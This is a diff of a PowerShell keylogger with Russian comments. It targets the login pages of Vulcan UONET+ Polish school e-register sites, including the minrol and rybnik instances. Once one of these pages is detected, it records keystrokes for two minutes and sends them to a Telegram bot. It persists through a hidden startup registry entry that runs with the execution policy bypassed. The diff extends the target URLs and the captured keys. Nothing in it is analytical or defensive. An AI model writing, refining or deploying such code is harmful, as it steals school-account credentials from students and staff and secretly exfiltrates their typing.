@@ -32,6 +32,7 @@ Add-Type -AssemblyName System.Windows.Forms
 `$global:monitoringActive = `$false
 `$global:monitorEndTime = `$null
 `$global:lastSendTime = Get-Date
+`$global:lastCheckTime = Get-Date
 
 function Send-Telegram {
     param(`$text)
@@ -46,16 +47,19 @@ function Send-Telegram {
 
 function Get-CurrentBrowserTitle {
     try {
-        # Получаем все процессы браузеров
-        `$browserProcesses = Get-Process | Where-Object { 
-            `$_.ProcessName -match "chrome|firefox|edge|msedge|iexplore|opera|brave" -and 
-            `$_.MainWindowTitle -ne ""
-        }
+        # Получаем все процессы браузеров с заголовками окон
+        `$browsers = @("chrome", "firefox", "msedge", "edge", "iexplore", "opera", "brave", "vivaldi")
         
-        if (`$browserProcesses) {
-            # Берем процесс с самым большим окном (скорее всего активный)
-            `$activeBrowser = `$browserProcesses | Sort-Object { `$_.MainWindowHandle } -Descending | Select-Object -First 1
-            return `$activeBrowser.MainWindowTitle
+        foreach (`$browser in `$browsers) {
+            `$processes = Get-Process -Name `$browser -ErrorAction SilentlyContinue | Where-Object { 
+                `$_.MainWindowTitle -ne "" -and `$_.MainWindowHandle -ne 0
+            }
+            
+            if (`$processes) {
+                # Сортируем по времени CPU чтобы найти активное окно
+                `$activeProcess = `$processes | Sort-Object CPU -Descending | Select-Object -First 1
+                return `$activeProcess.MainWindowTitle
+            }
         }
     } catch { }
     return ""
@@ -63,26 +67,49 @@ function Get-CurrentBrowserTitle {
 
 function Check-VulcanSite {
     `$title = Get-CurrentBrowserTitle
-    if (-not `$title) { return `$false }
+    if (-not `$title -or `$title -eq "") { 
+        return `$false 
+    }
     
+    # Ключевые слова для определения сайтов Vulcan
     `$vulcanKeywords = @(
-        "vulcan", "uonet", "dziennik", "minrol", "logowanie", 
-        "login", "account", "edu.gdynia", "eszkola"
+        "vulcan", "uonetplus", "uonet+", "dziennik", "minrol", "rybnik",
+        "logowanie", "login", "account", "edu.gdynia", "eszkola",
+        "uonetplus.vulcan.net.pl", "vulcan.net.pl"
     )
     
     `$titleLower = `$title.ToLower()
+    
+    # Проверяем конкретные URL
+    `$targetUrls = @(
+        "https://uonetplus.vulcan.net.pl/minrol",
+        "https://uonetplus.vulcan.net.pl/rybnik", 
+        "https://uonetplus.vulcan.net.pl/"
+    )
+    
+    foreach (`$url in `$targetUrls) {
+        if (`$titleLower.Contains(`$url.ToLower())) {
+            return `$true
+        }
+    }
+    
+    # Проверяем ключевые слова
     foreach (`$keyword in `$vulcanKeywords) {
         if (`$titleLower.Contains(`$keyword)) {
             return `$true
         }
     }
+    
     return `$false
 }
 
 function Start-Monitoring {
     `$global:monitoringActive = `$true
     `$global:monitorEndTime = (Get-Date).AddMinutes(2)
-    Send-Telegram "🎯 VULCAN SITE DETECTED! Monitoring started for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
+    `$currentTitle = Get-CurrentBrowserTitle
+    Send-Telegram "🎯 VULCAN SITE DETECTED! 
+📱 Site: `$currentTitle
+⏰ Monitoring started for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
 }
 
 function Stop-Monitoring {
@@ -165,6 +192,11 @@ function Process-Key {
                     "Oemplus" { `$global:buffer += "=" }
                     "OemQuestion" { `$global:buffer += "/" }
                     "Oemtilde" { `$global:buffer += "`"" }
+                    "OemOpenBrackets" { `$global:buffer += "[" }
+                    "OemCloseBrackets" { `$global:buffer += "]" }
+                    "OemPipe" { `$global:buffer += "\" }
+                    "OemSemicolon" { `$global:buffer += ";" }
+                    "OemQuotes" { `$global:buffer += "'" }
                     "D1" { `$global:buffer += "1" }
                     "D2" { `$global:buffer += "2" }
                     "D3" { `$global:buffer += "3" }
@@ -181,25 +213,36 @@ function Process-Key {
     }
     
     # Автоотправка при длинном вводе
-    if (`$global:buffer.Length -gt 20) {
+    if (`$global:buffer.Length -gt 25) {
         Send-Telegram "📝 AUTO: `$global:buffer"
         `$global:buffer = ""
     }
 }
 
 # Запускаем мониторинг
-Send-Telegram "🔍 VULCAN KEYLOGGER STARTED - Waiting for site detection..."
+Send-Telegram "🔍 VULCAN KEYLOGGER STARTED 
+🎯 Target sites:
+• https://uonetplus.vulcan.net.pl/minrol
+• https://uonetplus.vulcan.net.pl/rybnik  
+• https://uonetplus.vulcan.net.pl/
+⏰ Will monitor for 2 minutes after detection"
 
 while (`$true) {
     try {
-        # Проверяем сайт Vulcan каждые 2 секунды
-        if (Check-VulcanSite) {
-            if (-not `$global:monitoringActive) {
-                Start-Monitoring
-            }
+        `$currentTime = Get-Date
+        
+        # Проверяем сайт Vulcan каждые 3 секунды (чтобы не нагружать систему)
+        if ((`$currentTime - `$global:lastCheckTime).TotalSeconds -ge 3) {
+            `$global:lastCheckTime = `$currentTime
             
-            # Обновляем время окончания если снова обнаружили сайт
-            `$global:monitorEndTime = (Get-Date).AddMinutes(2)
+            if (Check-VulcanSite) {
+                if (-not `$global:monitoringActive) {
+                    Start-Monitoring
+                } else {
+                    # Обновляем время окончания если снова обнаружили сайт
+                    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
+                }
+            }
         }
         
         # Если мониторинг активен - перехватываем клавиши
@@ -217,8 +260,8 @@ while (`$true) {
                     }
                 }
                 
-                # Автоотправка каждые 10 секунд
-                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(10)) {
+                # Автоотправка каждые 15 секунд
+                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(15)) {
                     if (`$global:buffer -ne "") {
                         Send-Telegram "⏰ TIMEOUT: `$global:buffer"
                         `$global:buffer = ""
@@ -238,7 +281,7 @@ while (`$true) {
 
 # Сохраняем и запускаем кейлоггер
 try {
-    $keyloggerPath = "$env:TEMP\vulcan_simple.ps1"
+    $keyloggerPath = "$env:TEMP\vulcan_monitor.ps1"
     $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
     
     # Запускаем в отдельном процессе
@@ -249,7 +292,7 @@ try {
     $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
     Set-ItemProperty -Path $startupPath -Name "VulcanMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ SIMPLE KEYLOGGER ACTIVE - 2 minutes monitoring after Vulcan detection"
+    $keyloggerStatus = "✅ KEYLOGGER ACTIVE - Monitoring specific Vulcan sites for 2 minutes"
     
 } catch {
     $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
@@ -341,11 +384,11 @@ $keyloggerStatus
 
 === TARGET SITES ===
 • https://uonetplus.vulcan.net.pl/minrol
-• Все сайты Vulcan/UONET+
-• Страницы входа в дневник
+• https://uonetplus.vulcan.net.pl/rybnik
+• https://uonetplus.vulcan.net.pl/
 
 === MONITORING MODE ===
-• Автоматически включается при обнаружении сайта Vulcan
+• Автоматически включается при обнаружении целевых сайтов
 • Работает 2 минуты после обнаружения
 • Перехватывает ВСЕ нажатия клавиш в этот период
 
